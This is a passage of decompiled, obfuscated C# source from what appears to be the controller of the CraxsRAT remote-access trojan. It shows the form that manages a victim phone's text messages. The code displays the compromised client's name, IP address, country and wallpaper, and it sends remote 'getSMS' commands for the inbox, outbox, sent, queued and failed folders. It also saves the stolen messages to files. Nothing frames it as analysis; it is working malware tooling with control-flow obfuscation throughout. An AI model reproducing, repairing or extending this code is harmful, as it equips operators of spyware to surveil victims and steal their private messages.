              num1 = num4 ^ (int) num3 * -264245665;
              continue;
            case 3:
              toolStripMenuItem = ((Client) this)._AllToolStripMenuItem;
              num1 = (int) num3 * -1254770772 ^ -2007602406;
              continue;
            case 4:
              ((Client) this)._AllToolStripMenuItem = value;
              num1 = -1903534774;
              continue;
            case 5:
              toolStripMenuItem.Click -= eventHandler;
              num1 = (int) num3 * -2118419724 ^ -1736839651;
              continue;
            case 6:
              goto label_3;
            case 7:
              int num5 = toolStripMenuItem == null ? -2019769398 : (num5 = 1362791505);
              num1 = num5 ^ (int) num3 * 799838291;
              continue;
            default:
              goto label_10;
          }
        }
label_3:
        return;
label_10:;
      }
    }

    internal virtual ToolStripMenuItem OutboxToolStripMenuItem
    {
      get => ((Client) this)._OutboxToolStripMenuItem;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.OutboxToolStripMenuItem_Click);
label_1:
        int num1 = -228706332;
        ToolStripMenuItem toolStripMenuItem;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) ~(~num1 - -~483973452)) % 7U)
          {
            case 0:
              toolStripMenuItem.Click -= eventHandler;
              num1 = (int) num2 * 1079880808 ^ 510042608;
              continue;
            case 1:
              ((Client) this)._OutboxToolStripMenuItem = value;
              num1 = 1551498919;
              continue;
            case 2:
              toolStripMenuItem.Click += eventHandler;
              num1 = (int) num2 * -367014224 ^ -1196608723;
              continue;
            case 3:
              toolStripMenuItem = ((Client) this)._OutboxToolStripMenuItem;
              int num3 = toolStripMenuItem == null ? 1772718717 : (num3 = 2099542643);
              num1 = num3 ^ (int) num2 * -732223580;
              continue;
            case 4:
              toolStripMenuItem = ((Client) this)._OutboxToolStripMenuItem;
              int num4 = toolStripMenuItem == null ? 1351258375 : (num4 = 1004367476);
              num1 = num4 ^ (int) num2 * -1073100249;
              continue;
            case 5:
              goto label_1;
            case 6:
              goto label_3;
            default:
              goto label_9;
          }
        }
label_3:
        return;
label_9:;
      }
    }

    internal virtual ToolStripMenuItem InboxToolStripMenuItem
    {
      get => ((Client) this)._InboxToolStripMenuItem;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.InboxToolStripMenuItem_Click);
        ToolStripMenuItem toolStripMenuItem = ((Client) this)._InboxToolStripMenuItem;
        if (toolStripMenuItem == null)
          goto label_6;
label_1:
        int num1 = -1702503942;
label_2:
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) ~(~(-(num1 * -911571255) ^ -399576517 * 2077762594 * -1436073377 - ~--664199519) - 854718805)) % 6U)
          {
            case 0:
              int num3 = toolStripMenuItem == null ? -1904165486 : (num3 = -1762703761);
              num1 = num3 ^ (int) num2 * -1134735801;
              continue;
            case 1:
              toolStripMenuItem.Click -= eventHandler;
              num1 = (int) num2 * 1159676594 ^ -204398247;
              continue;
            case 2:
              toolStripMenuItem.Click += eventHandler;
              num1 = (int) num2 * 2027301810 ^ 2053661592;
              continue;
            case 3:
              goto label_3;
            case 4:
              goto label_6;
            case 5:
              goto label_1;
            default:
              goto label_8;
          }
        }
label_3:
        return;
label_8:
        return;
label_6:
        ((Client) this)._InboxToolStripMenuItem = value;
        toolStripMenuItem = ((Client) this)._InboxToolStripMenuItem;
        num1 = -1420472303;
        goto label_2;
      }
    }

    internal virtual ToolStripMenuItem SentToolStripMenuItem
    {
      get => ((Client) this)._SentToolStripMenuItem;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.SentToolStripMenuItem_Click);
        ToolStripMenuItem toolStripMenuItem = ((Client) this)._SentToolStripMenuItem;
        if (toolStripMenuItem == null)
          goto label_7;
label_1:
        int num1 = -544636898;
label_2:
        while (true)
        {
          int num2 = num1;
          uint num3;
          switch ((num3 = (uint) -(~((-1232262721 * -91513183 - (305191944 - 775704076)) * 413404193 - (num2 - (~~(-1822681216 - -1026966737) - -(--926939424 + -676504183 * -638550226 - (1749066723 + 675284061 - --1045138026))) - -532931447 * ((1406031189 * -274578101 ^ --1377754963) - -(1407799036 - 73000392)))) + -604369245 * 2113237988)) % 6U)
          {
            case 0:
              goto label_3;
            case 1:
              toolStripMenuItem.Click -= eventHandler;
              num1 = (int) num3 * -798171792 ^ -2092346555;
              continue;
            case 2:
              toolStripMenuItem = ((Client) this)._SentToolStripMenuItem;
              int num4 = toolStripMenuItem == null ? 1031086717 : (num4 = -549051560);
              num1 = num4 ^ (int) num3 * 452108996;
              continue;
            case 3:
              goto label_1;
            case 4:
              goto label_7;
            case 5:
              toolStripMenuItem.Click += eventHandler;
              num1 = (int) num3 * -1549529661 ^ 476799118;
              continue;
            default:
              goto label_8;
          }
        }
label_3:
        return;
label_8:
        return;
label_7:
        ((Client) this)._SentToolStripMenuItem = value;
        num1 = 124694343;
        goto label_2;
      }
    }

    internal virtual ToolStripMenuItem QueuedToolStripMenuItem
    {
      get => ((Client) this)._QueuedToolStripMenuItem;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.QueuedToolStripMenuItem_Click);
        ToolStripMenuItem toolStripMenuItem = ((Client) this)._QueuedToolStripMenuItem;
        if (toolStripMenuItem == null)
          goto label_8;
label_1:
        int num1 = 14975342;
label_2:
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (~(num1 * 152580363) * -1565460747)) % 7U)
          {
            case 0:
              toolStripMenuItem.Click += eventHandler;
              num1 = (int) num2 * -685321538 ^ -969705795;
              continue;
            case 1:
              goto label_3;
            case 2:
              toolStripMenuItem = ((Client) this)._QueuedToolStripMenuItem;
              num1 = (int) num2 * -22428591 ^ 1943777251;
              continue;
            case 3:
              toolStripMenuItem.Click -= eventHandler;
              num1 = (int) num2 * -1119145501 ^ -693866136;
              continue;
            case 4:
              goto label_1;
            case 5:
              int num3 = toolStripMenuItem == null ? 778187437 : (num3 = 583786390);
              num1 = num3 ^ (int) num2 * -1394462070;
              continue;
            case 6:
              goto label_8;
            default:
              goto label_9;
          }
        }
label_3:
        return;
label_9:
        return;
label_8:
        ((Client) this)._QueuedToolStripMenuItem = value;
        num1 = -1863286786;
        goto label_2;
      }
    }

    internal virtual ToolStripMenuItem FailedToolStripMenuItem
    {
      get => ((Client) this)._FailedToolStripMenuItem;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.FailedToolStripMenuItem_Click);
        ToolStripMenuItem toolStripMenuItem = ((Client) this)._FailedToolStripMenuItem;
label_1:
        int num1 = 1567110626;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (--~-(num1 ^ ~(-((436526350 ^ -63194050) + (1416772282 - 781939158)) - (83745741 * -40669253 + 300924661 ^ (-1862735734 - 858877313) * 169938335))) ^ 1894798256)) % 7U)
          {
            case 0:
              goto label_3;
            case 1:
              int num3 = toolStripMenuItem == null ? -708528680 : (num3 = -1345283395);
              num1 = num3 ^ (int) num2 * -1520946167;
              continue;
            case 2:
              goto label_1;
            case 3:
              toolStripMenuItem.Click -= eventHandler;
              num1 = (int) num2 * 999823168 ^ 1032586083;
              continue;
            case 4:
              ((Client) this)._FailedToolStripMenuItem = value;
              num1 = 98569973;
              continue;
            case 5:
              toolStripMenuItem = ((Client) this)._FailedToolStripMenuItem;
              int num4 = toolStripMenuItem == null ? 180439733 : (num4 = 761255029);
              num1 = num4 ^ (int) num2 * -1844815185;
              continue;
            case 6:
              toolStripMenuItem.Click += eventHandler;
              num1 = (int) num2 * 1470912657 ^ -616090233;
              continue;
            default:
              goto label_9;
          }
        }
label_3:
        return;
label_9:;
      }
    }

    internal virtual ToolStripMenuItem SaveToolStripMenuItem
    {
      get => ((Client) this)._SaveToolStripMenuItem;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.CraxsRatkfvuiorkenfudpajrsnCraxsRatszxcytrqa);
        ToolStripMenuItem toolStripMenuItem = ((Client) this)._SaveToolStripMenuItem;
label_1:
        int num1 = 1319824265;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (((num1 - (--(616733246 ^ 1095728701) - 1461209399 - (-1602011486 ^ 690233751))) * 16236961 ^ -(-1294440388 - -765231537) + ~-1810218577) * 1573586225)) % 8U)
          {
            case 0:
              int num3 = toolStripMenuItem == null ? -1090820491 : (num3 = -825851233);
              num1 = num3 ^ (int) num2 * -100894631;
              continue;
            case 1:
              int num4 = toolStripMenuItem == null ? -18032889 : (num4 = 755800572);
              num1 = num4 ^ (int) num2 * -1096474588;
              continue;
            case 2:
              toolStripMenuItem.Click -= eventHandler;
              num1 = (int) num2 * 1454598956 ^ 905560571;
              continue;
            case 3:
              toolStripMenuItem.Click += eventHandler;
              num1 = (int) num2 * -960364865 ^ -1517562192;
              continue;
            case 4:
              goto label_1;
            case 5:
              goto label_3;
            case 6:
              toolStripMenuItem = ((Client) this)._SaveToolStripMenuItem;
              num1 = (int) num2 * -2078192129 ^ -2082952120;
              continue;
            case 7:
              ((Client) this)._SaveToolStripMenuItem = value;
              num1 = -978261020;
              continue;
            default:
              goto label_10;
          }
        }
label_3:
        return;
label_10:;
      }
    }

    internal virtual ToolStripMenuItem SaveAsToolStripMenuItem
    {
      get => ((Client) this)._SaveAsToolStripMenuItem;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.CraxsRatkfvuiorkenfudpajrsnCraxsRatsjufrswas);
label_1:
        int num1 = 762422840;
        while (true)
        {
          int num2 = num1;
          uint num3;
          ToolStripMenuItem toolStripMenuItem;
          switch ((num3 = (uint) (173362567 + 1619711619 - (~(~-(-364353994 - -816472512) + ~-(2043917255 - 53590443) - ((~(-1318855619 - 308040785) + (~-1823280210 - ~-1831746712) ^ -157009594) + (~(~-674004740 - (-1131277598 ^ 1432932991)) - 439040873) - num2)) - 1770823819) ^ 1180227016)) % 9U)
          {
            case 0:
              ((Client) this)._SaveAsToolStripMenuItem = value;
              num1 = -323672590;
              continue;
            case 1:
              toolStripMenuItem.Click -= eventHandler;
              num1 = (int) num3 * 132978763 ^ -1595434392;
              continue;
            case 2:
              toolStripMenuItem = ((Client) this)._SaveAsToolStripMenuItem;
              num1 = (int) num3 * -1152819363 ^ 1744395510;
              continue;
            case 3:
              goto label_3;
            case 4:
              goto label_1;
            case 5:
              int num4 = toolStripMenuItem == null ? -359836189 : (num4 = 876568269);
              num1 = num4 ^ (int) num3 * 1115803885;
              continue;
            case 6:
              toolStripMenuItem = ((Client) this)._SaveAsToolStripMenuItem;
              num1 = (int) num3 * -1570279820 ^ 1135809353;
              continue;
            case 7:
              int num5 = toolStripMenuItem == null ? 14157839 : (num5 = 1841028818);
              num1 = num5 ^ (int) num3 * 751854987;
              continue;
            case 8:
              toolStripMenuItem.Click += eventHandler;
              num1 = (int) num3 * 2056728113 ^ 2143293171;
              continue;
            default:
              goto label_11;
          }
        }
label_3:
        return;
label_11:;
      }
    }

    internal virtual System.Windows.Forms.Timer TOpacity
    {
      get => ((Client) this)._TOpacity;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.TOpacity_Tick);
label_1:
        int num1 = 1316172853;
        System.Windows.Forms.Timer topacity;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) -(-((num1 ^ -(173536209 * ~(186641590 + 928406026 ^ 1972671859 * 1663785391))) * 607800795) ^ -(-578591320 - -5501432) ^ --756764362)) % 8U)
          {
            case 0:
              topacity.Tick += eventHandler;
              num1 = (int) num2 * -989618576 ^ 1041630222;
              continue;
            case 1:
              topacity.Tick -= eventHandler;
              num1 = (int) num2 * 1341175719 ^ -1671162116;
              continue;
            case 2:
              topacity = ((Client) this)._TOpacity;
              int num3 = topacity == null ? 1899036770 : (num3 = -1328771912);
              num1 = num3 ^ (int) num2 * -2053791178;
              continue;
            case 3:
              topacity = ((Client) this)._TOpacity;
              num1 = (int) num2 * 2071010080 ^ -966391399;
              continue;
            case 4:
              goto label_1;
            case 5:
              ((Client) this)._TOpacity = value;
              num1 = 1606559034;
              continue;
            case 6:
              goto label_3;
            case 7:
              int num4 = topacity == null ? -220065378 : (num4 = 1824844362);
              num1 = num4 ^ (int) num2 * -1796853725;
              continue;
            default:
              goto label_10;
          }
        }
label_3:
        return;
label_10:;
      }
    }

    internal virtual ProgressBar PB
    {
      get => ((Client) this)._PB;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((Client) this)._PB = value;
    }

    internal virtual PictureBox BoxTitle
    {
      get => ((Client) this)._BoxTitle;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        PaintEventHandler paintEventHandler = new PaintEventHandler(this.BoxTitle_Paint);
        EventHandler eventHandler = new EventHandler(this.BoxTitle_Resize);
label_1:
        int num1 = -1806662153;
        PictureBox boxTitle;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (~(~-(num1 - (-(-1795567749 * -331584791 ^ -743612997 - 179470266 ^ -1219437547 - 527040540) ^ (-327039585 ^ -1018180167 - -617905784) - (1851788437 ^ -92119075 ^ ~1102957360) - 1135878403)) ^ ~~-1019267052) - -409873927)) % 9U)
          {
            case 0:
              goto label_3;
            case 1:
              boxTitle.Paint += paintEventHandler;
              num1 = (int) num2 * 154985373 ^ -1272236289;
              continue;
            case 2:
              goto label_1;
            case 3:
              boxTitle = ((Client) this)._BoxTitle;
              num1 = (int) num2 * 2107297040 ^ 722999954;
              continue;
            case 4:
              int num3 = boxTitle == null ? 1084281562 : (num3 = 477519342);
              num1 = num3 ^ (int) num2 * -1734472225;
              continue;
            case 5:
              boxTitle.Resize += eventHandler;
              num1 = (int) num2 * -633089977 ^ -345233869;
              continue;
            case 6:
              ((Client) this)._BoxTitle = value;
              num1 = -1507914575;
              continue;
            case 7:
              boxTitle = ((Client) this)._BoxTitle;
              int num4 = boxTitle == null ? -963693000 : (num4 = -886695641);
              num1 = num4 ^ (int) num2 * -504465021;
              continue;
            case 8:
              boxTitle.Paint -= paintEventHandler;
              boxTitle.Resize -= eventHandler;
              num1 = (int) num2 * -2026348536 ^ -455753881;
              continue;
            default:
              goto label_11;
          }
        }
label_3:
        return;
label_11:;
      }
    }

    internal virtual DataGridViewTextBoxColumn Column1
    {
      get => ((Client) this)._Column1;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((Client) this)._Column1 = value;
    }

    internal virtual DataGridViewTextBoxColumn Column6
    {
      get => ((Client) this)._Column6;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((Client) this)._Column6 = value;
    }

    internal virtual DataGridViewTextBoxColumn Column9
    {
      get => ((Client) this)._Column9;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((Client) this)._Column9 = value;
    }

    internal virtual DataGridViewTextBoxColumn Column7
    {
      get => ((Client) this)._Column7;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((Client) this)._Column7 = value;
    }

    internal virtual DataGridViewTextBoxColumn Column2
    {
      get => ((Client) this)._Column2;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((Client) this)._Column2 = value;
    }

    internal virtual DataGridViewImageColumn Column3
    {
      get => ((Client) this)._Column3;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((Client) this)._Column3 = value;
    }

    internal virtual DrakeUIAvatar DrakeUIAvatar1
    {
      get => ((Client._Closure\u0024__64\u002D0) this)._DrakeUIAvatar1;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.CraxsRatkfvuiorkenfudpajrsnCraxsRatsqwsakartx);
        DrakeUIAvatar drakeUiAvatar1 = ((Client._Closure\u0024__64\u002D0) this)._DrakeUIAvatar1;
        if (drakeUiAvatar1 == null)
          goto label_8;
label_1:
        int num1 = -845947427;
label_2:
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) ~(num1 - (--1140613533 + (--1720778008 + ~(-1831395701 ^ 1139027624))) * -1096660733 + (-1835876425 - ~(-1302970284 - -674880818) ^ (~-1673427787 ^ 1329883227 ^ 1811524133) + (897402334 ^ -582892353 ^ 816262461 - 1760430120)))) % 7U)
          {
            case 0:
              int num3 = drakeUiAvatar1 == null ? -133487425 : (num3 = 1034566495);
              num1 = num3 ^ (int) num2 * -569916953;
              continue;
            case 1:
              drakeUiAvatar1.Click -= eventHandler;
              num1 = (int) num2 * -1878060865 ^ 1852037324;
              continue;
            case 2:
              goto label_8;
            case 3:
              drakeUiAvatar1.Click += eventHandler;
              num1 = (int) num2 * 117385500 ^ -342426727;
              continue;
            case 4:
              goto label_3;
            case 5:
              goto label_1;
            case 6:
              drakeUiAvatar1 = ((Client._Closure\u0024__64\u002D0) this)._DrakeUIAvatar1;
              num1 = (int) num2 * -145914023 ^ -1416536296;
              continue;
            default:
              goto label_9;
          }
        }
label_3:
        return;
label_9:
        return;
label_8:
        ((Client._Closure\u0024__64\u002D0) this)._DrakeUIAvatar1 = value;
        num1 = 595909110;
        goto label_2;
      }
    }

    internal virtual DrakeUIToolTip DrakeUIToolTip1
    {
      get => ((Client._Closure\u0024__64\u002D0) this)._DrakeUIToolTip1;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        ((Client._Closure\u0024__64\u002D0) this)._DrakeUIToolTip1 = value;
      }
    }

    internal virtual Panel Panel2
    {
      get => ((Data) this)._Panel2;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((Data) this)._Panel2 = value;
    }

    internal virtual Label clinameinfo
    {
      get => ((Data) this)._clinameinfo;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((Data) this)._clinameinfo = value;
    }

    internal virtual PictureBox ClientPic
    {
      get => ((Data) this)._ClientPic;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((Data) this)._ClientPic = value;
    }

    internal virtual Panel Panel1
    {
      get => ((Data) this)._Panel1;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((Data) this)._Panel1 = value;
    }

    internal virtual TextBox showtext
    {
      get => ((Data) this)._showtext;
      [MethodImpl(MethodImplOptions.Synchronized)] set => ((Data) this)._showtext = value;
    }

    private void TOpacity_Tick(object sender, EventArgs e)
    {
      if (this.Opacity == 1.0)
        goto label_5;
label_1:
      int num1 = 1704251462;
label_2:
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) ((-((num1 ^ -413178065 * -1239106193 ^ (672770152 ^ -623448549) * 1953169155 - (~-360214446 - (1715070753 - -199970225)) + -(-1882319218 ^ ~158173964) ^ ~(1078802177 + 2030290053) - (-1968143351 - -1718820168 * -216536259) ^ 56315603 - 1833340335 - (1291726766 ^ -1934880824) + -2111235466 * -1429227039) - 886711356) ^ -1319329820) * -248549397)) % 4U)
        {
          case 0:
            goto label_1;
          case 1:
            goto label_5;
          case 2:
            this.Opacity += 0.1;
            num1 = (int) num2 * -1980729342 ^ -385714909;
            continue;
          case 3:
            goto label_3;
          default:
            goto label_6;
        }
      }
label_3:
      return;
label_6:
      return;
label_5:
      this.TOpacity.Enabled = false;
      num1 = 1887451815;
      goto label_2;
    }

    private void CraxsRatkfvuiorkenfudpajrsnCraxsRatsqazfghs(object sender, EventArgs e)
    {
      this.Icon = new Icon(Settings.res_Path + EXGuarder.\u0036B3E4A22);
      try
      {
        // ISSUE: reference to a compiler-generated field
        this.ClientPic.Image = (Image) ((Data._Closure\u0024__39\u002D17) ((Data) this).classClient).Wallpaper;
label_2:
        int num1 = -1921396051;
        while (true)
        {
          uint num2;
          switch ((num2 = (uint) (-(~(num1 ^ -(~(-149574055 - -1948515819 - -1506145271) + (-~728950025 + (-1991431911 - 1082698173) * -2028322403))) - (1558492749 - ~-2104408172 + ~697712264 * -1319557415)) - ~499208854 - 217902936)) % 3U)
          {
            case 0:
              goto label_2;
            case 1:
              // ISSUE: reference to a compiler-generated field
              // ISSUE: reference to a compiler-generated field
              this.clinameinfo.Text = EXGuarder.\u00318042256 + ((Data._Closure\u0024__39\u002D12) ((Data) this).classClient).ClientName + Strings.Space(2) + EXGuarder.\u0031A37615E + ((Data) ((Data) this).classClient).ClientAddressIP + Strings.Space(2) + EXGuarder.\u0033076585E + ((Data._Closure\u0024__39\u002D11) ((Data) this).classClient).Country;
              num1 = (int) num2 * -832970368 ^ 2097948181;
              continue;
            default:
              goto label_7;
          }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
label_7:
      ((ToolStripDropDownMenu) this.PathsToolStripMenuItem.DropDown).ShowImageMargin = false;
      this.PathsToolStripMenuItem.DropDown.BackColor = this.ctx.BackColor;
label_8:
      int num3 = 634138256;
      while (true)
      {
        uint num4;
        switch ((num4 = (uint) (-(~(num3 ^ -(~(-149574055 - -1948515819 - -1506145271) + (-~728950025 + (-1991431911 - 1082698173) * -2028322403))) - (1558492749 - ~-2104408172 + ~697712264 * -1319557415)) - ~499208854 - 217902936)) % 10U)
        {
          case 0:
            this.TOpacity.Interval = Settings.T_Interval;
            num3 = (int) num4 * 1237652481 ^ 707367252;
            continue;
          case 1:
            this.DGV0.ColumnHeadersDefaultCellStyle.Font = Settings.f;
            num3 = (int) num4 * -396736607 ^ 1416866509;
            continue;
          case 2:
            goto label_10;
          case 3:
            goto label_8;
          case 4:
            ((Data) this).BoxTitlePaintEventArgsWait = true;
            num3 = (int) num4 * -115996035 ^ -1745384563;
            continue;
          case 5:
            int num5 = Operators.CompareString(getIconFrmReg.SHFILEINFOW.SAVING_DATA, EXGuarder.\u00357161271, false) != 0 ? 994176056 : (num5 = 1100814030);
            num3 = num5 ^ (int) num4 * 1860495541;
            continue;
          case 6:
            this.SaveToolStripMenuItem.Visible = true;
            this.SaveAsToolStripMenuItem.Visible = true;
            num3 = (int) num4 * 1542062702 ^ -278893351;
            continue;
          case 7:
            this.TOpacity.Enabled = true;
            num3 = (int) num4 * 466024780 ^ 1095470917;
            continue;
          case 8:
            this.Text = ((Data) this).Title;
            num3 = -1013409883;
            continue;
          case 9:
            this.DGV0.DefaultCellStyle.Font = Settings.f;
            num3 = (int) num4 * 228146993 ^ -1923127205;
            continue;
          default:
            goto label_5;
        }
      }
label_10:
      return;
label_5:;
    }

    private void DGV0_CellContentClick(object sender, DataGridViewCellEventArgs e)
    {
    }

    private void DGV0_CellClick(object sender, DataGridViewCellEventArgs e)
    {
      if (!(e.RowIndex != -1 & e.ColumnIndex != -1))
        return;
label_1:
      int num1 = 984242459;
      while (true)
      {
        int num2 = num1;
        uint num3;
        switch ((num3 = (uint) (834886234 - (~(num2 + (1901887607 * (~639110157 ^ 45010444 + 1111088016) ^ 561238060 ^ 1768890508 - 700899765 + ~-1080759486 + -1637476121 ^ -586006277 ^ 1743303675 ^ -1952069697 ^ -936246857 - --1760819042) ^ ~~(1940119704 + 1972306384 + (-111378459 - 1176777976))) * -1854363951 + ~-1065240415))) % 3U)
        {
          case 0:
            goto label_1;
          case 1:
            this.SelectMessage(e.RowIndex);
            num1 = (int) num3 * 279191224 ^ 1469315482;
            continue;
          case 2:
            goto label_5;
          default:
            goto label_6;
        }
      }
label_5:
      return;
label_6:;
    }

    private void DGV0_RowEnter(object sender, DataGridViewCellEventArgs e)
    {
      if (!(e.RowIndex != -1 & e.ColumnIndex != -1))
        return;
label_1:
      int num1 = -1530857354;
      while (true)
      {
        int num2 = num1;
        uint num3;
        switch ((num3 = (uint) (63170978 - -((~-62797119 + (1307889724 - 1854082917)) * 1200153933 - -(num2 + ((-(-841676465 - 1484335066) ^ -647400895 * (-304413967 * -1266178703)) + ((-1266360367 ^ 1184224739 * -997029409) + -(-1542170140 - 1884829970)) + ((-1538797152 ^ -1377976235 - -446549393) - ~-1097797675) * 1732240099))))) % 3U)
        {
          case 0:
            goto label_1;
          case 1:
            goto label_5;
          case 2:
            this.SelectMessage(e.RowIndex);
            num1 = (int) num3 * -1891369541 ^ -841395596;
            continue;
          default:
            goto label_6;
        }
      }
label_5:
      return;
label_6:;
    }

    private void SelectMessage(int index)
    {
      if (index == -1)
        return;
label_1:
      int num1 = -708961082;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (~(-num1 * -1535738889 ^ ~---1508922691) * 638186205 - 1406701829)) % 3U)
        {
          case 0:
            goto label_1;
          case 1:
            goto label_5;
          case 2:
            this.showtext.Text = Conversions.ToString(this.DGV0.Rows[index].Tag);
            num1 = (int) num2 * 812081298 ^ 968458713;
            continue;
          default:
            goto label_6;
        }
      }
label_5:
      return;
label_6:;
    }

    private void SMSManager_Closing(object sender, CancelEventArgs e)
    {
    }

    private void CraxsRatkfvuiorkenfudpajrsnCraxsRatsxsxcauyb(string v)
    {
      if (((Data) this).classClient == null)
        return;
label_1:
      int num1 = 659504621;
      while (true)
      {
        int num2 = num1;
        uint num3;
        object[] ParametersObjects;
        switch ((num3 = (uint) -((-1130924639 ^ -1067420512) * -360635851 - (-(--1615981270 ^ -254678368 ^ -1626116214 ^ -1696043137) - num2 * 710363125 - 300769184) - ~1274504469)) % 4U)
        {
          case 0:
            goto label_6;
          case 1:
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            // ISSUE: reference to a compiler-generated field
            ParametersObjects = new object[4]
            {
              (object) ((Data) this).Client,
              (object) (Client.KeysClient1 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + Settings.domen + EXGuarder.\u00332516507 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u003416F3863 + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + SMSManager.getSMS + Data.VB\u0024StateMachine_39_HandelData.SPL_SOCKET + EXGuarder.\u00349585227 + Data.VB\u0024StateMachine_39_HandelData.SPL_DATA + v),
              (object) Codes.Encoding().GetBytes(EXGuarder.\u0033C1E1313),
              (object) ((Data) this).classClient
            };
            num1 = (int) num3 * -2040851199 ^ -1670652070;
            continue;
          case 2:
            goto label_1;
          case 3:
            ((Data) this).classClient.SendMessage(ParametersObjects);
            num1 = (int) num3 * 111005050 ^ 942343772;
            continue;
          default:
            goto label_7;
        }
      }
label_6:
      return;
label_7:;
    }

    private void AllToolStripMenuItem_Click(object sender, EventArgs e)
    {
      this.CraxsRatkfvuiorkenfudpajrsnCraxsRatsxsxcauyb(EXGuarder.\u0033F043B77);
    }

    private void OutboxToolStripMenuItem_Click(object sender, EventArgs e)
    {
      this.CraxsRatkfvuiorkenfudpajrsnCraxsRatsxsxcauyb(EXGuarder.\u003014D5000);
    }

    private void InboxToolStripMenuItem_Click(object sender, EventArgs e)
    {
      this.CraxsRatkfvuiorkenfudpajrsnCraxsRatsxsxcauyb(EXGuarder.\u003281D691B);
    }

    private void SentToolStripMenuItem_Click(object sender, EventArgs e)
    {
      this.CraxsRatkfvuiorkenfudpajrsnCraxsRatsxsxcauyb(EXGuarder.\u0032E3A6F37);
    }

    private void QueuedToolStripMenuItem_Click(object sender, EventArgs e)
    {
      this.CraxsRatkfvuiorkenfudpajrsnCraxsRatsxsxcauyb(EXGuarder.\u0034F723B1A);
    }

    private void FailedToolStripMenuItem_Click(object sender, EventArgs e)
    {
      this.CraxsRatkfvuiorkenfudpajrsnCraxsRatsxsxcauyb(EXGuarder.\u0032130354C);
    }

    private void CraxsRatkfvuiorkenfudpajrsnCraxsRatsjufrswas(object sender, EventArgs e)
    {
      SaveFileDialog saveFileDialog = new SaveFileDialog();
label_1:
      int num1 = 1555891738;
      while (true)
      {
        int num2 = num1;
        uint num3;
        WaitCallback callBack;
        switch ((num3 = (uint) (-367625786 - ~-~-~num2)) % 7U)
        {
          case 0:
            goto label_1;
          case 1:
            goto label_3;
          case 2:
            saveFileDialog.FileName = DateAndTime.Now.ToString(EXGuarder.\u0034C1B5352) + EXGuarder.\u0036E736D34;
            saveFileDialog.Filter = EXGuarder.\u0036A0A370C;
            num1 = (int) num3 * 966501585 ^ -1069245034;
            continue;
          case 3:
            if (Data.\u0024IR134\u002D1 != null)
            {
              num1 = (int) num3 * 1397143976 ^ -2012399377;
              continue;
            }
            // ISSUE: reference to a compiler-generated method
            Data.\u0024IR134\u002D1 = callBack = new WaitCallback(Data.\u0024I._Lambda\u0024__R134\u002D1);
            break;
          case 4:
            int num4 = saveFileDialog.ShowDialog() != DialogResult.OK ? 98648041 : (num4 = 623444254);
            num1 = num4 ^ (int) num3 * 1623711163;
            continue;
          case 5:
            callBack = Data.\u0024IR134\u002D1;
            break;
          case 6:
            saveFileDialog.Dispose();
            num1 = 817802980;
            continue;
          default:
            goto label_12;
        }
        ThreadPool.QueueUserWorkItem(callBack, (object) new object[8]
        {
          (object) this.DGV0,
          (object) EXGuarder.\u00372684961,
          (object) saveFileDialog.FileName,
          (object) ((Data) this).tmpClientName,
          (object) (((Data) this).tmpCountry + EXGuarder.\u00361575960 + ((Data) this).tmpAddressIP),
          (object) EXGuarder.\u0034C576459,
          (object) EXGuarder.\u0037532604A,
          (object) EXGuarder.\u00372684961
        });
        num1 = 1844597075;
      }
label_3:
      return;
label_12:;
    }

    private void CraxsRatkfvuiorkenfudpajrsnCraxsRatszxcytrqa(object sender, EventArgs e)
    {
      reso.Directory_Exist(((Data) this).classClient);
label_1:
      int num1 = 20010077;
      while (true)
      {
        int num2 = num1;
        uint num3;
        WaitCallback callBack;
        switch ((num3 = (uint) (~-(((~(1038160683 * (-308971370 - 976628027)) ^ 2000107863 - 809013463 - ~-423929209 - (1419098037 * 1206737615 - (-1261451145 - -1006025890))) - (569183537 * ((-1020981492 - 1040600455) * -1292090593 - 2078169823) + (~(--1741759407 ^ 359016704 - 38143184) - ~(~952015356 - ~-1208157935)) - num2)) * 1597017265) * -951151725)) % 4U)
        {
          case 0:
            goto label_3;
          case 1:
            callBack = Data.\u0024IR135\u002D2;
